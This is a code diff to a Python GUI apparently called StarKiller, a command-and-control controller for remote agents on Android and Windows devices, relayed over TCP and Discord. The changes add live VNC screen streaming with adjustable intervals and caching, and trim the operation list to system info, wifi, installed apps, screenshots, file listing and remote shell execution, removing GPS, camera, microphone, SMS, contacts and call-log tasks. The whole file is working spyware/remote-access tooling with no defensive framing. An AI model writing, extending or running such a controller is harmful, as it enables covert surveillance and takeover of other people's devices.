@@ -81,7 +81,7 @@ def agent_recv(sock):
             return None
         hdr += chunk
     length = struct.unpack(">I", hdr)[0]
-    if length > 10 * 1024 * 1024:
+    if length > 20 * 1024 * 1024:
         return None
     body = b""
     while len(body) < length:
@@ -110,6 +110,8 @@ class Agent:
         self.last_seen = time.time()
         self.last_gps = None
         self.last_screenshot = None
+        self.last_frame_time = 0
+        self.frame_count = 0
         self.pending_results = {}
         self.relay = info.get("relay", "tcp")
 
@@ -189,8 +191,6 @@ def handle_agent_message(agent_id, msg):
         agent.last_seen = time.time()
         if "battery" in msg:
             agent.battery = msg["battery"]
-        if "gps" in msg or "last_gps" in msg:
-            agent.last_gps = msg.get("last_gps") or msg.get("gps")
 
     elif msg_type == "output":
         line = msg.get("line", "")
@@ -203,15 +203,13 @@ def handle_agent_message(agent_id, msg):
             console_write(f"[!] [{agent.display_name()}] Task {task_id} error: {data['error']}", "error")
         else:
             if isinstance(data, dict):
-                if "latitude" in data:
-                    agent.last_gps = f"{data['latitude']},{data['longitude']}"
-
+                # VNC frame — "frame" is index int, "data" is base64 JPEG
                 if "frame" in data and "data" in data:
                     try:
                         frame_bytes = base64.b64decode(data["data"])
                         agent.last_screenshot = frame_bytes
-                        fn = data.get("frame", 0)
-                        console_write(f"  [{agent.display_name()}] vnc frame {fn} ({len(frame_bytes)}b)", "info")
+                        agent.frame_count += 1
+                        agent.last_frame_time = time.time()
                     except Exception as ex:
                         console_write(f"  [{agent.display_name()}] vnc decode error: {ex}", "error")
                     return
@@ -325,7 +323,7 @@ class DiscordRelay:
                     data = json.loads(content[11:])
                     aid = data.get("agent_id", "")
                     handle_agent_message(aid, {"type": "heartbeat", **data})
-                except Exception as e:
+                except Exception:
                     pass
 
             elif content.startswith("!file "):
@@ -333,7 +331,7 @@ class DiscordRelay:
                     data = json.loads(content[6:])
                     aid = data.get("agent_id", "")
                     handle_agent_message(aid, {"type": "file_data", **data})
-                except Exception as e:
+                except Exception:
                     pass
 
             if message.attachments:
@@ -392,6 +390,10 @@ class StarKillerGUI:
         self.console_pos = 0
         self.live_photo = None
 
+        # State caches to prevent unnecessary redraws
+        self._agent_list_sig = None
+        self._detail_sig = None
+
         style = ttk.Style()
         style.theme_use("clam")
         style.configure(".", background=BG, foreground=TEXT, fieldbackground=BG3)
@@ -424,7 +426,6 @@ class StarKillerGUI:
                  font=("Consolas", 16, "bold")).pack(side="left", padx=(16, 4))
         tk.Label(hdr, text="C2 CONTROLLER", bg=BG2, fg=DIM,
                  font=("Consolas", 9)).pack(side="left")
-
         tk.Label(hdr, text="22DIV // george wu", bg=BG2, fg=DIM,
                  font=("Consolas", 9)).pack(side="left", padx=20)
 
@@ -449,10 +450,6 @@ class StarKillerGUI:
 
         self.agent_list_frame = tk.Frame(self.sidebar, bg=BG2)
         self.agent_list_frame.pack(fill="x")
-
-        self.no_agents_label = tk.Label(self.agent_list_frame, text="Waiting for connections...",
-                                         bg=BG2, fg=DIM, font=("Consolas", 9))
-        self.no_agents_label.pack(padx=12, pady=8, anchor="w")
 
         sep = tk.Frame(self.sidebar, bg=BORDER, height=1)
         sep.pack(fill="x", padx=8, pady=4)
@@ -480,8 +477,13 @@ class StarKillerGUI:
         self.screen_frame.pack(side="left", fill="y", padx=(4, 0), pady=4)
         self.screen_frame.pack_propagate(False)
 
-        tk.Label(self.screen_frame, text="LIVE SCREEN", bg="#000000", fg=DIM,
-                 font=("Consolas", 8, "bold")).pack(pady=(4, 0))
+        screen_hdr = tk.Frame(self.screen_frame, bg="#000000")
+        screen_hdr.pack(fill="x")
+        tk.Label(screen_hdr, text="LIVE SCREEN", bg="#000000", fg=DIM,
+                 font=("Consolas", 8, "bold")).pack(side="left", padx=8, pady=(4, 0))
+        self.fps_label = tk.Label(screen_hdr, text="", bg="#000000", fg=GREEN,
+                                   font=("Consolas", 8))
+        self.fps_label.pack(side="right", padx=8, pady=(4, 0))
 
         self.screen_label = tk.Label(self.screen_frame, bg="#000000", fg=DIM,
                                       text="No feed", font=("Consolas", 10))
@@ -501,6 +503,15 @@ class StarKillerGUI:
                                          activebackground=BG2, activeforeground=AMBER,
                                          command=lambda: self._op("screenshot"))
         self.screenshot_btn.pack(side="left", padx=4, pady=2)
+
+        # VNC interval control
+        tk.Label(vnc_bar, text="ms:", bg=BG3, fg=DIM,
+                 font=("Consolas", 7)).pack(side="left", padx=(8, 0))
+        self.interval_var = tk.StringVar(value="500")
+        interval_entry = tk.Entry(vnc_bar, textvariable=self.interval_var,
+                                   bg=BG, fg=TEXT, insertbackground=TEXT,
+                                   font=("Consolas", 8), width=5, relief="flat")
+        interval_entry.pack(side="left", padx=2)
 
         console_frame = tk.Frame(top_main, bg=BG)
         console_frame.pack(side="left", fill="both", expand=True)
@@ -541,14 +552,12 @@ class StarKillerGUI:
         for w in self.ops_frame.winfo_children():
             w.destroy()
 
+        # Only ops that work with stripped manifest
         ops = [
-            ("SYSINFO", "sysinfo"), ("GPS", "gps"),
-            ("CAMERA", "camera"), ("MIC", "mic"),
-            ("SMS", "sms_read"), ("CONTACTS", "contacts"),
-            ("CALLS", "calllog"), ("APPS", "apps"),
-            ("SCREEN", "screenshot"), ("SCR GRANT", "screen_grant"),
-            ("FILES", "ls"), ("DOWNLOAD", "download"),
-            ("EXEC", "exec"), ("PING", "ping"),
+            ("SYSINFO", "sysinfo"),   ("WIFI",     "wifi"),
+            ("APPS",    "apps"),      ("SCREEN",   "screenshot"),
+            ("SCR GRANT","screen_grant"), ("FILES", "ls"),
+            ("EXEC",    "exec"),      ("PING",     "ping"),
         ]
 
         for i, (label, op) in enumerate(ops):
@@ -562,17 +571,19 @@ class StarKillerGUI:
         self.ops_frame.grid_columnconfigure(0, weight=1)
         self.ops_frame.grid_columnconfigure(1, weight=1)
 
-        recon_btn = tk.Button(self.ops_frame, text="FULL RECON", bg=BG3, fg=RED,
+        recon_btn = tk.Button(self.ops_frame, text="RECON", bg=BG3, fg=RED,
                                font=("Consolas", 8, "bold"), relief="flat",
                                activebackground=BG2, activeforeground=RED,
                                command=lambda: self._op("recon"))
-        recon_btn.grid(row=len(ops) // 2, column=0, columnspan=2, padx=2, pady=(4, 2), sticky="ew")
+        recon_btn.grid(row=len(ops) // 2, column=0, columnspan=2,
+                        padx=2, pady=(4, 2), sticky="ew")
 
         vnc_btn = tk.Button(self.ops_frame, text="VNC STREAM", bg=BG3, fg=GREEN,
                               font=("Consolas", 8, "bold"), relief="flat",
                               activebackground=BG2, activeforeground=GREEN,
                               command=self._toggle_vnc)
-        vnc_btn.grid(row=len(ops) // 2 + 1, column=0, columnspan=2, padx=2, pady=1, sticky="ew")
+        vnc_btn.grid(row=len(ops) // 2 + 1, column=0, columnspan=2,
+                      padx=2, pady=1, sticky="ew")
 
     def _build_footer(self):
         ftr = tk.Frame(self.root, bg=BG2, height=28)
@@ -590,68 +601,81 @@ class StarKillerGUI:
                  font=("Consolas", 9)).pack(side="right", padx=12)
 
     def _refresh_agents(self):
-        for w in self.agent_list_frame.winfo_children():
-            w.destroy()
-
         with agents_lock:
             agent_list = [(aid, a) for aid, a in agents.items()]
 
         online = sum(1 for _, a in agent_list if a.connected)
         self.agent_count_label.config(text=f"AGENTS: {online}")
 
-        if not agent_list:
-            self.no_agents_label = tk.Label(self.agent_list_frame, text="Waiting for connections...",
-                                             bg=BG2, fg=DIM, font=("Consolas", 9))
-            self.no_agents_label.pack(padx=12, pady=8, anchor="w")
-            return
+        # Only rebuild widget tree when agent state actually changes
+        sig = tuple((aid, a.connected, aid == self.selected_agent) for aid, a in agent_list)
+        if sig != self._agent_list_sig:
+            self._agent_list_sig = sig
+            for w in self.agent_list_frame.winfo_children():
+                w.destroy()
 
-        for aid, agent in agent_list:
-            is_selected = aid == self.selected_agent
-            bg = BG3 if is_selected else BG2
-            frame = tk.Frame(self.agent_list_frame, bg=bg, cursor="hand2")
-            frame.pack(fill="x", padx=4, pady=1)
-            frame.bind("<Button-1>", lambda e, a=aid: self._select_agent(a))
+            if not agent_list:
+                tk.Label(self.agent_list_frame, text="Waiting for connections...",
+                         bg=BG2, fg=DIM, font=("Consolas", 9)).pack(padx=12, pady=8, anchor="w")
+            else:
+                for aid, agent in agent_list:
+                    is_selected = aid == self.selected_agent
+                    bg = BG3 if is_selected else BG2
+                    frame = tk.Frame(self.agent_list_frame, bg=bg, cursor="hand2")
+                    frame.pack(fill="x", padx=4, pady=1)
+                    frame.bind("<Button-1>", lambda e, a=aid: self._select_agent(a))
 
-            dot_color = GREEN if agent.connected else RED
-            dot = tk.Canvas(frame, width=10, height=10, bg=bg, highlightthickness=0)
-            dot.create_oval(1, 1, 9, 9, fill=dot_color, outline=dot_color)
-            dot.pack(side="left", padx=(8, 4), pady=4)
-            dot.bind("<Button-1>", lambda e, a=aid: self._select_agent(a))
+                    dot_color = GREEN if agent.connected else RED
+                    dot = tk.Canvas(frame, width=10, height=10, bg=bg, highlightthickness=0)
+                    dot.create_oval(1, 1, 9, 9, fill=dot_color, outline=dot_color)
+                    dot.pack(side="left", padx=(8, 4), pady=4)
+                    dot.bind("<Button-1>", lambda e, a=aid: self._select_agent(a))
 
-            icon = "A" if agent.platform == "android" else "W"
-            icon_color = GREEN if agent.platform == "android" else BLUE
-            tk.Label(frame, text=icon, bg=bg, fg=icon_color,
-                     font=("Consolas", 11, "bold")).pack(side="left", padx=2)
+                    icon = "A" if agent.platform == "android" else "W"
+                    icon_color = GREEN if agent.platform == "android" else BLUE
+                    tk.Label(frame, text=icon, bg=bg, fg=icon_color,
+                             font=("Consolas", 11, "bold")).pack(side="left", padx=2)
 
-            info_frame = tk.Frame(frame, bg=bg)
-            info_frame.pack(side="left", fill="x", expand=True, padx=4)
-            info_frame.bind("<Button-1>", lambda e, a=aid: self._select_agent(a))
+                    info_frame = tk.Frame(frame, bg=bg)
+                    info_frame.pack(side="left", fill="x", expand=True, padx=4)
+                    info_frame.bind("<Button-1>", lambda e, a=aid: self._select_agent(a))
 
-            tk.Label(info_frame, text=agent.display_name(), bg=bg, fg=WHITE,
-                     font=("Consolas", 9), anchor="w").pack(anchor="w")
-            tk.Label(info_frame, text=f"{agent.ip} | {agent.relay.upper()}", bg=bg, fg=DIM,
-                     font=("Consolas", 8), anchor="w").pack(anchor="w")
+                    tk.Label(info_frame, text=agent.display_name(), bg=bg, fg=WHITE,
+                             font=("Consolas", 9), anchor="w").pack(anchor="w")
+                    tk.Label(info_frame, text=f"{agent.ip} | {agent.relay.upper()}", bg=bg, fg=DIM,
+                             font=("Consolas", 8), anchor="w").pack(anchor="w")
 
-            tk.Label(frame, text=aid[:6], bg=bg, fg=RED,
-                     font=("Consolas", 8, "bold")).pack(side="right", padx=8)
+                    tk.Label(frame, text=aid[:6], bg=bg, fg=RED,
+                             font=("Consolas", 8, "bold")).pack(side="right", padx=8)
 
         self._refresh_detail()
 
     def _select_agent(self, agent_id):
         self.selected_agent = agent_id if self.selected_agent != agent_id else None
+        self._agent_list_sig = None  # force redraw on next poll
         self._refresh_agents()
 
     def _refresh_detail(self):
-        for w in self.detail_frame.winfo_children():
-            w.destroy()
-
         if not self.selected_agent:
+            if self._detail_sig is not None:
+                self._detail_sig = None
+                for w in self.detail_frame.winfo_children():
+                    w.destroy()
             return
 
         with agents_lock:
             agent = agents.get(self.selected_agent)
         if not agent:
             return
+
+        # Only rebuild detail if values changed
+        sig = (agent.battery, agent.last_gps, agent.os_info, agent.ip)
+        if sig == self._detail_sig:
+            return
+        self._detail_sig = sig
+
+        for w in self.detail_frame.winfo_children():
+            w.destroy()
 
         tk.Label(self.detail_frame, text="DEVICE INFO", bg=BG2, fg=PURPLE,
                  font=("Consolas", 9, "bold"), anchor="w").pack(fill="x", padx=12, pady=(4, 2))
@@ -673,7 +697,7 @@ class StarKillerGUI:
             row.pack(fill="x", padx=12)
             tk.Label(row, text=label, bg=BG2, fg=DIM,
                      font=("Consolas", 8), width=10, anchor="w").pack(side="left")
-            tk.Label(row, text=val, bg=BG2, fg=color,
+            tk.Label(row, text=str(val), bg=BG2, fg=color,
                      font=("Consolas", 8), anchor="e").pack(side="right")
 
     def _op(self, op):
@@ -700,14 +724,6 @@ class StarKillerGUI:
             if path is None:
                 return
             kwargs["path"] = path or "/sdcard"
-        elif op == "camera":
-            kwargs["camera"] = "front"
-        elif op == "mic":
-            from tkinter.simpledialog import askinteger
-            dur = askinteger("Mic", "Duration (seconds):", initialvalue=10, parent=self.root)
-            if not dur:
-                return
-            kwargs["duration"] = dur
         elif op == "download":
             from tkinter.simpledialog import askstring
             path = askstring("Download", "File path:", initialvalue="/sdcard/", parent=self.root)
@@ -715,7 +731,7 @@ class StarKillerGUI:
                 return
             kwargs["path"] = path
         elif op == "recon":
-            for sub_op in ["sysinfo", "gps", "sms_read", "contacts", "calllog", "apps"]:
+            for sub_op in ["sysinfo", "wifi", "apps"]:
                 agent.send_task(sub_op)
                 time.sleep(0.1)
             return
@@ -737,10 +753,15 @@ class StarKillerGUI:
             self.vnc_btn.config(text="START VNC", fg=GREEN)
             console_write("[*] VNC stream stopped", "warn")
         else:
+            try:
+                interval = int(self.interval_var.get())
+            except ValueError:
+                interval = 500
+            self.vnc_interval = interval
             self.vnc_active = True
             self.vnc_btn.config(text="STOP VNC", fg=RED)
-            agent.send_task("vnc", frames=999, interval=self.vnc_interval)
-            console_write("[*] VNC stream started", "ok")
+            agent.send_task("vnc", frames=9999, interval=interval)
+            console_write(f"[*] VNC stream started ({interval}ms interval)", "ok")
 
     def _update_screen(self):
         if not self.selected_agent:
@@ -748,7 +769,20 @@ class StarKillerGUI:
 
         with agents_lock:
             agent = agents.get(self.selected_agent)
-        if not agent or not agent.last_screenshot:
+        if not agent:
+            return
+
+        # Update FPS label during active VNC
+        if self.vnc_active and agent.last_frame_time > 0:
+            age = time.time() - agent.last_frame_time
+            if age < 5:
+                self.fps_label.config(text=f"#{agent.frame_count} | {self.vnc_interval}ms")
+            else:
+                self.fps_label.config(text="stalled")
+        elif not self.vnc_active:
+            self.fps_label.config(text="")
+
+        if not agent.last_screenshot:
             return
 
         if not HAS_PIL:
@@ -820,6 +854,11 @@ class StarKillerGUI:
                         console_write(f"  {aid} | {a.display_name()} | {a.ip} | {status} | {a.relay}", "info")
             elif op == "select" and len(parts) > 1:
                 self._select_agent(parts[1].strip())
+            elif op == "vnc" and len(parts) > 1:
+                try:
+                    self.interval_var.set(parts[1].strip())
+                except Exception:
+                    pass
             elif op == "discord":
                 if discord_bot and discord_bot.ready.is_set():
                     console_write("[+] Discord relay: ONLINE", "ok")
@@ -827,10 +866,11 @@ class StarKillerGUI:
                     console_write("[!] Discord relay: OFFLINE", "error")
             elif op == "help":
                 for line in [
-                    "!agents      - List connected agents",
-                    "!select <id> - Select agent by ID",
-                    "!discord     - Check Discord relay status",
-                    "<command>    - Execute shell command on selected agent",
+                    "!agents         - List connected agents",
+                    "!select <id>    - Select agent by ID",
+                    "!vnc <ms>       - Set VNC interval (e.g. !vnc 250)",
+                    "!discord        - Check Discord relay status",
+                    "<command>       - Execute shell command on selected agent",
                 ]:
                     console_write(f"  {line}", "info")
             return
